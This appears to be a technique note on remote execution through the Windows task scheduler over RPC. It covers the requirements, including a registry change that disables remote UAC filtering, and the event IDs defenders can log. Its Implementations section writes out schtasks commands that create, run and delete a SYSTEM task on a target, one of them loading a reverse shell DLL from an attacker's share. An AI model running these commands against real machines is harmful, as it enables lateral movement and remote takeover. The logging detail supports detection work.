Table of Contents
=================

* [schtasks (Technique)](#schtasks-technique)
   * [Summary](#summary)
   * [How it works (deeply)](#how-it-works-deeply)
   * [Requirements](#requirements)
   * [Logs](#logs)
      * [Security Logs](#security-logs)
      * [Sysmon Logs](#sysmon-logs)
      * [TaskSchedular Logs](#taskschedular-logs)
         * [Create](#create)
         * [Run](#run)
         * [Delete](#delete)
   * [Remarks](#remarks)
   * [Implementations](#implementations)
   * [References](#references)


schtasks (Technique)
============

## Summary

Windows allows remote Administrators to interact with the task
schedular over RPC.

## How it works (deeply)

...

## Requirements

1. RPC is running
	```bash
	Get-Service RpcSs,RpcEptMapper,DcomLaunch
	```

2. RPC (port 135) and high ports are accessible (through firewall)

3. Administrator permission on the target computer

4. Remote UAC (UAC Over network) disabled if the user chosen to
authenticate with is a **local user** and not a domain user
```bash
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
# Restart the 'Server' service might be required (I have tested twice on a Windows 10 and it **was not** required)
```

## Logs

#### Security Logs

- 4624, Logon event - Network Logon, Type 3
- 4672, Special Logon (If the user is Administrator)

#### Sysmon Logs

- 1, Process Create - the task's process created by the parent image
`svchost -k netsvcs -p -s Schedule`
- 3, Network connection detected - from the "attacker" source IP
- 11, File created, a file for the task is created in
`C:\Windows\System32\Tasks\<TASK NAME>`


#### TaskSchedular Logs

###### Create
- 106, Task registered - the name of the task is logged

###### Run
- 325, Launch request queued
- 129, Created Task Process
- 100, Task Started
- 200, Action started
- 110, Task triggered by user
- 201, Action completed
- 102, Task completed

###### Delete
- 141, Task registration deleted

## Remarks

*

## Implementations

- schtasks.exe
```bash
# Execute command and dump output to file
schtasks.exe /create /sc ONCE /tn EvilTask /tr "cmd /c dir C:\Windows > C:\output.txt" /st 00:00 /ru System /s <TARGET_IP>

# Execute a reverse shell payload
schtasks.exe /create /sc ONCE /tn EvilTask /tr "rundll32.exe Shell32.dll,ControlRunDLL \\<ATTACKER_IP>\EvilShare\reverse_tcp.dll" /st 00:00 /ru System /s <TARGET_IP>

# Execute the task
schtasks.exe /run /tn EvilTask /s <TARGET_IP>

# Delete the task
schtasks.exe /delete /tn EvilTask /s <TARGET_IP> /f
```

## References

- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks
